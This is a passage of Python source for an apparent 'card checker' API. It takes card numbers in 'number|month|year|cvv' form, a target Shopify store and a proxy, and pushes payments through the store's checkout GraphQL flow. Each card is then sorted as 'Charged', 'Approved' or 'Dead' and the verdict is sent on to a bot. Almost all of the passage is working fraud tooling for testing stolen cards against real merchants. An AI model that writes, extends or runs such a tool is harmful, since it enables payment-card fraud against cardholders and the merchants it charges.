    "...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
    "...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}"
    "__typename}"
)

POLL_QUERY = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!){"
    "receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){"
    "...ReceiptDetails __typename}}"
    "fragment ReceiptDetails on Receipt{"
    "...on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}"
    "...on ProcessingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
    "...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}"
    "__typename}"
)


# ═══ KNOWN DECLINES ═══
KNOWN_DECLINES = {
    "CARD_DECLINED": "CARD_DECLINED",
    "GENERIC_DECLINE": "GENERIC_DECLINE",
    "INSUFFICIENT_FUNDS": "INSUFFICIENT_FUNDS",
    "DO_NOT_HONOR": "DO_NOT_HONOR",
    "EXPIRED_CARD": "EXPIRED_CARD",
    "INCORRECT_CVC": "INVALID_CVV",
    "INCORRECT_NUMBER": "INCORRECT_NUMBER",
    "INCORRECT_ZIP": "INVALID_ZIP",
    "INCORRECT_ADDRESS": "INVALID_ADDRESS",
    "INVALID_CVC": "INVALID_CVV",
    "INVALID_EXPIRY_DATE": "INVALID_EXPIRY",
    "INVALID_NUMBER": "INVALID_NUMBER",
    "PROCESSING_ERROR": "PROCESSING_ERROR",
    "PAYMENT_METHOD_UNAVAILABLE": "PAYMENT_METHOD_UNAVAILABLE",
    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED": "EXPIRED_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_CVV_FAILED": "INVALID_CVV",
    "PAYMENTS_CREDIT_CARD_BASE_ADDRESS_FAILED": "INVALID_ADDRESS",
    "PAYMENTS_CREDIT_CARD_BASE_ZIP_FAILED": "INVALID_ZIP",
    "PAYMENTS_CREDIT_CARD_BASE_DECLINED": "CARD_DECLINED",
    "PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS": "INSUFFICIENT_FUNDS",
    "PAYMENTS_CREDIT_CARD_BASE_DO_NOT_HONOR": "DO_NOT_HONOR",
    "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT": "PAYMENT_AMOUNT_INVALID",
    "PAYMENTS_UNACCEPTABLE_PAYMENT_METHOD": "PAYMENT_METHOD_REJECTED",
    "PAYMENTS_UNACCEPTABLE": "PAYMENTS_UNACCEPTABLE",
    "OTP_REQUIRED": "3DS_REQUIRED",
    "ORDER_PLACED": "ORDER_PLACED",
    "CAPTCHA_REQUIRED": "CAPTCHA_REQUIRED",
    "SITE_NOT_SUPPORTED": "SITE_NOT_SUPPORTED",
    "THROTTLED": "THROTTLED",
    "MISMATCHED_BILL": "MISMATCHED_BILL",
}


def parse_response(raw_message, success_flag=False):
    """Always return a valid (code, label, is_ok)"""
    if success_flag:
        return "ORDER_PLACED", "Order Placed", True

    if not raw_message:
        return "CARD_DECLINED", "Card Declined", False

    text = str(raw_message).strip()
    if not text:
        return "CARD_DECLINED", "Card Declined", False

    upper = text.upper()

    # Try exact known matches first
    for key in sorted(KNOWN_DECLINES.keys(), key=len, reverse=True):
        if key in upper:
            code = KNOWN_DECLINES[key]
            return code, code.replace("_", " ").title(), code == "ORDER_PLACED"

    # Try extracting code
    clean = extract_clean_response(text)
    if clean and clean != "UNKNOWN_ERROR":
        return clean, clean.replace("_", " ").title(), False

    # Last resort — never return UNKNOWN_ERROR
    return "CARD_DECLINED", text[:60], False


# ═══ RUN CHECK ═══
def run_check(site, cc, proxy=None, debug=False):
    parts = cc.split("|")
    if len(parts) != 4:
        return {
            "Response": "INVALID_FORMAT",
            "Price": "-",
            "Gateway": "Unknown",
            "Status": "Dead",
        }

    debug_log = [] if debug else None

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            success, message, gateway, price_raw, currency = loop.run_until_complete(
                process_card(parts[0], parts[1], parts[2], parts[3], site, None, proxy, debug_log)
            )
        finally:
            loop.close()
    except Exception as e:
        return {
            "Response": "CARD_DECLINED",
            "Price": "-",
            "Gateway": "Unknown",
            "Status": "Site Error",
            "Debug": " | ".join(debug_log) if debug_log else str(e)[:80],
        }

    # Ensure message is never None/empty
    if not message:
        message = "CARD_DECLINED"

    code, label, is_ok = parse_response(message, success)

    # Determine status
    if is_ok:
        status = "Charged"
    elif code in ("3DS_REQUIRED", "OTP_REQUIRED", "INSUFFICIENT_FUNDS"):
        status = "Approved"
    elif any(x in code for x in ("SITE", "PROXY", "CAPTCHA", "THROTTLED", "CHECKPOINT", "REQUEST", "INVALID_JSON", "PROPOSAL", "NO_SESSION", "NO_DELIVERY", "NO_PAYMENT", "VAULT", "EMPTY_SUBMIT", "SUBMIT_PARSE", "POLL", "CHANGE_PROXY", "EXCEPTION")):
        status = "Site Error"
    else:
        status = "Dead"

    # Build price with clean format
    price_display = clean_price(price_raw)

    # Response text for bot.py
    if is_ok:
        response_text = "ORDER_PLACED"
    elif code == "3DS_REQUIRED":
        response_text = "3DS_REQUIRED"
    elif code in ("INSUFFICIENT_FUNDS",):
        response_text = "INSUFFICIENT_FUNDS"
    elif code in ("SITE_NOT_SUPPORTED",):
        response_text = "SITE_NOT_SUPPORTED"
    elif code.startswith("EXCEPTION"):
        response_text = "CARD_DECLINED"
    else:
        response_text = code or "CARD_DECLINED"

    result = {
        "Response": response_text,
        "Price": price_display,
        "Gateway": gateway if gateway and gateway != "UNKNOWN" else "Shopify",
        "Status": status,
        "code": code,
        "message": message[:100],
    }
    if debug:
        result["Debug"] = " | ".join(debug_log)
    return result


# ═══ HTTP HANDLER ═══
class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _send_json(self, status, payload):
        try:
            body = json.dumps(payload).encode("utf-8")
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(body)
        except Exception:
            pass

    def log_message(self, fmt, *args):
        sys.stderr.write(f"[{BRAND.lower()}-api] " + (fmt % args) + "\n")

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        qs = parse_qs(parsed.query, keep_blank_values=True)

        if path in ("/", "/health"):
            self._send_json(200, {
                "status": "ok",
                "service": "jinx-api",
                "version": VERSION,
            })
            return

        if path.lower() in ("/shopify", "/shopify/"):
            cc = (qs.get("cc", [""])[0] or "").strip()
            site = (qs.get("site", [""])[0] or "").strip()
            proxy = (qs.get("proxy", [""])[0] or "").strip() or None
            debug = (qs.get("debug", ["0"])[0] or "0") == "1"

            if not cc or not site:
                self._send_json(400, {
                    "Response": "MISSING_PARAMS",
                    "Price": "-",
                    "Gateway": "UNKNOWN",
                    "Status": "Site Error",
                })
                return

            try:
                result = executor.submit(run_check, site, cc, proxy, debug).result(timeout=180)
                self._send_json(200, result)
            except Exception as e:
                self._send_json(500, {
                    "Response": "CARD_DECLINED",
                    "Price": "-",
                    "Gateway": "UNKNOWN",
                    "Status": "Site Error",
                })
            return

        self._send_json(404, {"error": "not found"})

    def do_POST(self):
        self.do_GET()


executor = ThreadPoolExecutor(max_workers=WORKERS)


def main():
    print()
    print("╔══════════════════════════════════════════════════════════╗")
    print(f"║  {BRAND} API v{VERSION} (ShopifyK-Based FIXED)              ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"  Listening : http://{HOST}:{PORT}")
    print(f"  Workers   : {WORKERS}")
    print(f"  Endpoint  : GET /Shopify?cc=<card>&site=<site>&proxy=<opt>&debug=0|1")
    print()
    server = ThreadingHTTPServer((HOST, PORT), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n  Shutting down...")
        server.shutdown()


if __name__ == "__main__":
    main()
